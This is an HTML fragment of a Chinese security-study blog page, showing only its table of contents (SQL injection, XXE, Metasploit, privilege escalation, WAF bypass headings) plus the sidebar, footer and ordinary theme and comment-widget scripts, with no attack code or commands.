href="#3-system%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8"><span class="toc-number">12.4.3.</span> <span class="toc-text">3.system（）函数利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%A6%82%E6%9E%9C%E6%9C%89%E5%86%99%E6%9D%83%E9%99%90%E7%9A%84%E8%AF%9D"><span class="toc-number">12.4.4.</span> <span class="toc-text">4.如果有写权限的话</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">13.</span> <span class="toc-text">XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-3"><span class="toc-number">13.1.</span> <span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">13.2.</span> <span class="toc-text">2.攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-blind-xxe"><span class="toc-number">13.3.</span> <span class="toc-text">3.blind xxe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-xxe%E9%98%B2%E5%BE%A1"><span class="toc-number">13.4.</span> <span class="toc-text">4.xxe防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">14.</span> <span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-4"><span class="toc-number">14.1.</span> <span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95magic-function"><span class="toc-number">14.2.</span> <span class="toc-text">2.魔术方法magic function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%98%B2%E5%BE%A1"><span class="toc-number">14.3.</span> <span class="toc-text">3.防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8F%90%E6%9D%83"><span class="toc-number">15.</span> <span class="toc-text">windows服务器提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">15.1.</span> <span class="toc-text">1.提权方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83"><span class="toc-number">16.</span> <span class="toc-text">linux提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">17.</span> <span class="toc-text">安全漏洞检测与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-number">17.1.</span> <span class="toc-text">1.漏洞信息的组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="toc-number">17.2.</span> <span class="toc-text">2.常见的系统漏洞扫描器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">17.3.</span> <span class="toc-text">3.漏洞扫描基本流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E8%AF%86%E5%88%AB%E5%8E%9F%E7%90%86"><span class="toc-number">17.4.</span> <span class="toc-text">4.漏洞识别原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Nmap%E6%89%AB%E6%8F%8F%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.5.</span> <span class="toc-text">5.Nmap扫描漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-NESSUS"><span class="toc-number">17.6.</span> <span class="toc-text">6.NESSUS:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Metasploit%E4%BB%8B%E7%BB%8D%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">17.7.</span> <span class="toc-text">7.Metasploit介绍与漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#metasploit%E9%87%8D%E8%A6%81%E6%A8%A1%E5%9D%97"><span class="toc-number">17.7.1.</span> <span class="toc-text">metasploit重要模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#metasploit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">17.7.2.</span> <span class="toc-text">metasploit常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#metasploit%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%85%B6%E6%B5%81%E7%A8%8B"><span class="toc-number">17.7.3.</span> <span class="toc-text">metasploit攻击思路及其流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#metasploit%E8%BF%9B%E8%A1%8Cms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">17.7.4.</span> <span class="toc-text">metasploit进行ms17_010漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#metasploit%E7%94%A8ms17-010%E6%BC%8F%E6%B4%9E%E2%80%93%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7"><span class="toc-number">17.7.5.</span> <span class="toc-text">metasploit用ms17_010漏洞–远程监控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#metasploit%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9D%97-meterpreter"><span class="toc-number">17.7.6.</span> <span class="toc-text">metasploit扩展模块-meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">17.7.6.1.</span> <span class="toc-text">meterpreter常用命令</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="toc-number">18.</span> <span class="toc-text">windows系统安全加固</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF"><span class="toc-number">18.1.</span> <span class="toc-text">安全基线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%EF%BC%9A"><span class="toc-number">18.2.</span> <span class="toc-text">漏洞修复：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="toc-number">18.3.</span> <span class="toc-text">安全加固</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#owasp"><span class="toc-number">19.</span> <span class="toc-text">owasp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-woasp-top10"><span class="toc-number">19.1.</span> <span class="toc-text">1.woasp top10</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">19.1.1.</span> <span class="toc-text">1.注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A4%B1%E6%95%88%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-number">19.1.2.</span> <span class="toc-text">2.失效身份认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">19.1.3.</span> <span class="toc-text">3.敏感信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%A4%B1%E6%95%88%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">19.1.4.</span> <span class="toc-text">5.失效的访问控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">19.1.5.</span> <span class="toc-text">6.安全配置错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">19.1.6.</span> <span class="toc-text">8.不安全的反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E4%BD%BF%E7%94%A8%E5%90%AB%E6%9C%89%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-number">19.1.7.</span> <span class="toc-text">9.使用含有已知漏洞的组件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E4%B8%8D%E8%B6%B3%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%92%8C%E7%9B%91%E6%8E%A7"><span class="toc-number">19.1.8.</span> <span class="toc-text">10.不足的日志记录和监控</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">20.</span> <span class="toc-text">web漏洞扫描与渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">20.1.</span> <span class="toc-text">1.漏洞验证基本流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AF%BB%E6%87%82%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A"><span class="toc-number">20.2.</span> <span class="toc-text">2.读懂漏洞扫描报告</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95%E7%BC%96%E5%86%99"><span class="toc-number">20.3.</span> <span class="toc-text">3.漏洞记录编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-web%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">20.4.</span> <span class="toc-text">4.web应用渗透基本思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E6%A1%88%E4%BE%8B"><span class="toc-number">20.4.1.</span> <span class="toc-text">1.渗透测试基础案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AWVS"><span class="toc-number">21.</span> <span class="toc-text">AWVS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#APPSCAN"><span class="toc-number">22.</span> <span class="toc-text">APPSCAN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">23.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#masscan%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="toc-number">24.</span> <span class="toc-text">masscan端口扫描器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">25.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-5"><span class="toc-number">25.1.</span> <span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%B1%E5%AE%B3-2"><span class="toc-number">25.2.</span> <span class="toc-text">2.危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%88%90%E5%9B%A0"><span class="toc-number">25.3.</span> <span class="toc-text">3.成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%86%E7%B1%BB"><span class="toc-number">25.4.</span> <span class="toc-text">4.分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-sql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">25.5.</span> <span class="toc-text">5.sql注入测试的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E7%82%B9%E6%9F%A5%E6%89%BE"><span class="toc-number">25.5.1.</span> <span class="toc-text">1.注入点查找</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9E%84%E9%80%A0%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5"><span class="toc-number">25.5.2.</span> <span class="toc-text">2.构造测试语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-%E6%95%B0%E5%AD%97%E5%9E%8B-amp-%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">25.6.</span> <span class="toc-text">6.手工注入-数字型&amp;字符型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">26.</span> <span class="toc-text">sql联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">27.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E6%8F%90"><span class="toc-number">27.1.</span> <span class="toc-text">1.前提</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">28.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-6"><span class="toc-number">28.1.</span> <span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%86%E7%B1%BB"><span class="toc-number">28.2.</span> <span class="toc-text">2.分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%89%8D%E6%8F%90"><span class="toc-number">28.3.</span> <span class="toc-text">3.前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">28.4.</span> <span class="toc-text">4.基于布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">28.5.</span> <span class="toc-text">5.时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%89%8D%E6%8F%90-1"><span class="toc-number">28.5.1.</span> <span class="toc-text">1.前提</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86"><span class="toc-number">28.6.</span> <span class="toc-text">2.原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">29.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">29.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64%E6%B3%A8%E5%85%A5"><span class="toc-number">30.</span> <span class="toc-text">base64注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">30.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">31.</span> <span class="toc-text">sql注入-搜索型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">32.</span> <span class="toc-text">sql注入-cookie注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">32.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap"><span class="toc-number">33.</span> <span class="toc-text">sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-number">33.1.</span> <span class="toc-text">1.常见参数：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%AE%BE%E7%BD%AE%E7%9B%AE%E6%A0%87url"><span class="toc-number">33.1.1.</span> <span class="toc-text">1.设置目标url</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%AE%BE%E7%BD%AE%E5%9B%9E%E6%98%BE%E7%AD%89%E7%BA%A7"><span class="toc-number">33.1.2.</span> <span class="toc-text">2.设置回显等级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AE%BE%E7%BD%AE%E6%8E%A2%E6%B5%8B%E7%AD%89%E7%BA%A7"><span class="toc-number">33.1.3.</span> <span class="toc-text">3.设置探测等级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%AE%BE%E7%BD%AEHTTP%E6%95%B0%E6%8D%AE%E5%8C%85%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-number">33.1.4.</span> <span class="toc-text">4.设置HTTP数据包参数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8sqlmap%E8%8E%B7%E5%8F%96dvwa%E6%95%B0%E6%8D%AE"><span class="toc-number">33.2.</span> <span class="toc-text">2.使用sqlmap获取dvwa数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97"><span class="toc-number">34.</span> <span class="toc-text">sql绕过安全狗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%86%85%E9%93%BE%E6%B3%A8%E9%87%8A%E6%AD%A3%E5%B8%B8%E7%BB%95%E8%BF%87"><span class="toc-number">34.1.</span> <span class="toc-text">方法一：内链注释正常绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%86%85%E8%81%94%E5%8F%8D%E5%90%91%E6%80%9D%E7%BB%B4%E7%BB%95%E8%BF%87"><span class="toc-number">34.2.</span> <span class="toc-text">方法二：内联反向思维绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9AGET%E4%BC%A0%E5%8F%82%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">34.3.</span> <span class="toc-text">方法三：GET传参绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9Aurl%E7%BC%96%E7%A0%81-16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">34.4.</span> <span class="toc-text">方法四：url编码+16进制编码绕过</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/19.html" title="PowerCat&amp;&amp;SSH使用"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302300983.jpeg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="PowerCat&amp;&amp;SSH使用"/></a><div class="content"><a class="title" href="/posts/19.html" title="PowerCat&amp;&amp;SSH使用">PowerCat&amp;&amp;SSH使用</a><time datetime="2021-11-30T14:11:12.000Z" title="发表于 2021-11-30 22:11:12">2021-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/18.html" title="NECAT使用"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111300418219.jpeg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="NECAT使用"/></a><div class="content"><a class="title" href="/posts/18.html" title="NECAT使用">NECAT使用</a><time datetime="2021-11-29T18:01:12.000Z" title="发表于 2021-11-30 02:01:12">2021-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/17.html" title="域内信息收集+icmp隧道"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111300420199.jpeg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="域内信息收集+icmp隧道"/></a><div class="content"><a class="title" href="/posts/17.html" title="域内信息收集+icmp隧道">域内信息收集+icmp隧道</a><time datetime="2021-11-29T16:18:31.000Z" title="发表于 2021-11-30 00:18:31">2021-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/16.html" title="域内信息收集"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111261150870.jpeg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="域内信息收集"/></a><div class="content"><a class="title" href="/posts/16.html" title="域内信息收集">域内信息收集</a><time datetime="2021-11-22T13:00:01.000Z" title="发表于 2021-11-22 21:00:01">2021-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3.html" title="内网信息收集"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111260313439.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="内网信息收集"/></a><div class="content"><a class="title" href="/posts/3.html" title="内网信息收集">内网信息收集</a><time datetime="2021-11-19T15:00:00.000Z" title="发表于 2021-11-19 23:00:00">2021-11-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> BigBug</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '3FhzzOf9adU6BTrugxetNi0g-MdYXbMMI',
      appKey: 'J8477pu5qR8IdlvCb3dfIySL',
      placeholder: '畅所欲言！',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://bigbug888.github.io/posts/20.html'
    this.page.identifier = 'posts/20.html'
    this.page.title = '网安奥利给'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://xianqi.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script defer id="dsq-count-scr" src="//xianqi.disqus.com/count.js" async></script><script defer type="text/javascript" src="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/js/sakura.js"></script><script defer type="text/javascript" src="https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/js/animate.js"></script><div class="aplayer no-destroy" data-id="2871897839" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="true" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script>window.$crisp = [];
window.CRISP_WEBSITE_ID = "482d6e0b-ea62-40df-8441-51800cdfab1c";
(function () {
  d = document;
  s = d.createElement("script");
  s.src = "https://client.crisp.chat/l.js";
  s.async = 1;
  d.getElementsByTagName("head")[0].appendChild(s);
})();
$crisp.push(["safe", true])

if (false) {
  $crisp.push(["do", "chat:hide"])
  $crisp.push(["on", "chat:closed", function() {
    $crisp.push(["do", "chat:hide"])
  }])
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      $crisp.push(["do", "chat:show"])
